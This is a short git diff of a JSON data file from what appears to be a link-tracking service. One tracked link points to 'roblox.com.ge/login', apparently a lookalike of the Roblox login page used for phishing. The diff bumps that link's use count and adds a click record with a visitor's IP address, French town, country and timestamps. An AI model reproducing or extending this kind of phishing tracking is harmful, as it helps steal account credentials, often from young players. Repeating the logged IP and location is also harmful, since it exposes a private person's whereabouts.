@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1652,
+    "useCount": 1653,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13379,6 +13379,14 @@
       },
       {
         "timestamp": 1777580859998,
+        "ip": "82.65.89.137",
+        "country": "France",
+        "city": "Donnemarie-Dontilly",
+        "flag": "🇫🇷",
+        "countryCode": "FR"
+      },
+      {
+        "timestamp": 1777580945196,
         "ip": "82.65.89.137",
         "country": "France",
         "city": "Donnemarie-Dontilly",
